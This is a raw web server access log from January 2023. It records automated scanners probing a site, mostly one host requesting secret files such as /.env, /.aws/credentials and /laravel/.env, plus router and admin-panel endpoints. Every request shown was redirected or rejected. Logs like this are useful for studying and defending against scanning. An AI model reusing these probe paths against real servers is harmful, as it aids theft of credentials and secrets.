193.32.162.159 - - [24/Jan/2023:17:38:38 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [24/Jan/2023:18:07:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.12.253.180 - - [24/Jan/2023:18:48:17 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
45.12.253.180 - - [24/Jan/2023:18:48:21 -0600] "POST /HNAP1/ HTTP/1.1" 301 238 "-" "Mozila/5.0"
107.170.234.10 - - [24/Jan/2023:19:00:02 -0600] "GET /druid/index.html HTTP/1.1" 301 248 "-" "Mozilla/5.0 zgrab/0.x"
109.237.97.180 - - [24/Jan/2023:19:05:45 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:45 -0600] "\x16\x03\x01\x01H\x01" 400 226 "-" "-"
109.237.97.180 - - [24/Jan/2023:19:05:45 -0600] "POST /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:45 -0600] "GET /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:45 -0600] "POST /.aws/credentials HTTP/1.1" 301 248 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:46 -0600] "GET /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:46 -0600] "POST /.aws/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:46 -0600] "GET /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:47 -0600] "POST /aws/credentials HTTP/1.1" 301 247 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:47 -0600] "GET /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:47 -0600] "POST /credentials HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:48 -0600] "GET /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:48 -0600] "POST /test.php HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:48 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:49 -0600] "POST /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:49 -0600] "GET /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:49 -0600] "POST /demo/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:50 -0600] "GET /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [24/Jan/2023:19:05:50 -0600] "POST /web/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
